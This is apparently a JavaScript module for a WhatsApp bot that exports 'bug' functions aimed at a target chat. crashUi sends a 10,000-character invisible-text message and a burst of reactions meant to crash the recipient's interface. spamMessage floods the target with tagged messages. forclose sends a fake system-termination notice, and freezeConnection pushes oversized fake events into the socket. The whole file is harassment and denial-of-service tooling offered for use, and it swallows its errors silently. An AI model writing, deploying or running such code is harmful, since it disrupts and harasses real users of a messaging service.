const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const bugFunctions = {
    delayHard: async (sock, target, timeMs = 5000) => {
        try {
            await delay(timeMs);
            for (let i = 0; i < 3; i++) {
                await sock.sendMessage(target, { text: `⏰ DELAY: ${i+1}/3` }).catch(() => {});
                await delay(1000);
            }
            return true;
        } catch (e) { return false; }
    },
    
    crashUi: async (sock, target) => {
        try {
            await sock.sendMessage(target, { text: '‎'.repeat(10000) }).catch(() => {});
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(target, { 
                    react: { text: '💀', key: { remoteJid: target } } 
                }).catch(() => {});
            }
            return true;
        } catch (e) { return false; }
    },
    
    forclose: async (sock, target) => {
        try {
            await sock.sendMessage(target, { text: '```[SYSTEM] TERMINATED```' }).catch(() => {});
            await sock.chatModify({ pin: false, archive: true }, target).catch(() => {});
            return true;
        } catch (e) { return false; }
    },
    
    spamMessage: async (sock, target, count = 10) => {
        try {
            const texts = ['💀 HERIKEYZENLOCKER', '🔥 BANJARAN SUDOM', '👑 LAMPUNG SELATAN'];
            for (let i = 0; i < count; i++) {
                await sock.sendMessage(target, { text: texts[i % texts.length] + ` [${i+1}]` }).catch(() => {});
                await delay(300);
            }
            return true;
        } catch (e) { return false; }
    },
    
    freezeConnection: async (sock) => {
        try {
            for (let i = 0; i < 100; i++) {
                sock.ev.emit('messages.upsert', { 
                    messages: [{ message: { conversation: 'x'.repeat(5000) } }] 
                }).catch(() => {});
            }
            return true;
        } catch (e) { return false; }
    }
};

module.exports = { bugFunctions };
